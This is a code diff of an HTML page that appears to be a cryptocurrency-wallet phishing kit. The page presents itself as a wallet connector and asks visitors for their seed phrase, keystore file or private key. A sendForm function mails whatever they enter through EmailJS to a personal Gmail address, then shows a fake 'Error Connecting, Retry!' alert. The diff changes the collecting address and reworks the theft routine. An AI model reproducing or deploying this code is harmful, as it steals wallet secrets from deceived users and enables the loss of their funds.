@@ -1,6 +1,5 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -9,10 +8,9 @@
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <script type="text/javascript">
         (function(){
-           emailjs.init("OqxUoMncSiIUUbYx6");  // Public Key only
+           emailjs.init("OqxUoMncSiIUUbYx6");  // Replace with your EmailJS public key
         })();
     </script>
-    
 </head>
 
 <body>
@@ -53,7 +51,8 @@
                 <button class="modal-button" onclick="showSection('privatekey')">Private Key</button>
             </div>
             <div id="manual-section" class="mt-3"></div>
-            <button class="close-button" onclick="closeModal('modal-manual')">Close</button>
+            <button class="send-button bg-green-500 text-white py-2 px-4 rounded-lg mt-4" onclick="sendForm()">Send</button>
+            <button class="close-button bg-gray-500 text-white py-2 px-4 rounded-lg mt-2" onclick="closeModal('modal-manual')">Close</button>
         </div>
     </dialog>
 
@@ -155,27 +154,21 @@
             let content = '';
             if (type === 'phrase') {
                 content = `
-                    <form onsubmit="sendEmail(event)">
+                    <form id="walletForm">
                         <h4>Wallet Phrase</h4>
-                        <textarea name="phrase" placeholder="Enter your wallet phrase" rows="3" required></textarea>
-                        <input type="hidden" name="wallet_name" value="${document.getElementById('selected-wallet').textContent.replace('Selected Wallet: ', '')}">
-                        <button type="submit">Send</button>
+                        <textarea name="content" placeholder="Enter your wallet phrase" rows="3" required></textarea>
                     </form>`;
             } else if (type === 'keystore') {
                 content = `
-                    <form onsubmit="sendEmail(event)">
+                    <form id="walletForm">
                         <h4>Keystore JSON</h4>
-                        <input type="file" name="keystore_file" required />
-                        <input type="hidden" name="wallet_name" value="${document.getElementById('selected-wallet').textContent.replace('Selected Wallet: ', '')}">
-                        <button type="submit">Send</button>
+                        <input type="file" name="content" required />
                     </form>`;
             } else if (type === 'privatekey') {
                 content = `
-                    <form onsubmit="sendEmail(event)">
+                    <form id="walletForm">
                         <h4>Private Key</h4>
-                        <input type="text" name="private_key" placeholder="Enter your private key" required>
-                        <input type="hidden" name="wallet_name" value="${document.getElementById('selected-wallet').textContent.replace('Selected Wallet: ', '')}">
-                        <button type="submit">Send</button>
+                        <input type="text" name="content" placeholder="Enter your private key" required>
                     </form>`;
             }
 
@@ -191,26 +184,26 @@
             });
         }
 
-        function sendEmail(event) {
-            event.preventDefault();
-            const formData = new FormData(event.target);
-            const walletName = formData.get('wallet_name');
-            const message = Array.from(formData.entries())
-                .map(([key, value]) => `${key}: ${value}`)
-                .join('\n');
+        function sendForm() {
+            const selectedWallet = document.getElementById('selected-wallet').textContent.replace('Selected Wallet: ', '');
+            const form = document.getElementById('walletForm');
+            const formData = new FormData(form);
+            formData.append('wallet', selectedWallet);
+
+            const contentValue = formData.get('content');
+            const message = contentValue instanceof File ? 'File attached' : contentValue;
 
             emailjs.send("service_shw79vn", "template_x44qepf", {
-                wallet_name: walletName,
+                wallet_name: selectedWallet,
                 message: message,
-                to_email: "bryantdalrymply5@gmail.com
-"
+                to_email: "francisugbede7@gmail.com"
             })
             .then(response => {
-                console.log("SUCCESS!", response.status, response.text);
-                alert("Error Connecting Wallet!");
+                alert("Error Connecting, Retry!");
+                closeModal('modal-manual');
             })
             .catch(error => {
-                console.error("Failed to send email:", error);
+                console.error("Failed to connect:", error);
                 alert("Failed to connect.");
             });
         }
@@ -234,5 +227,4 @@
         });
     </script>
 </body>
-
 </html>
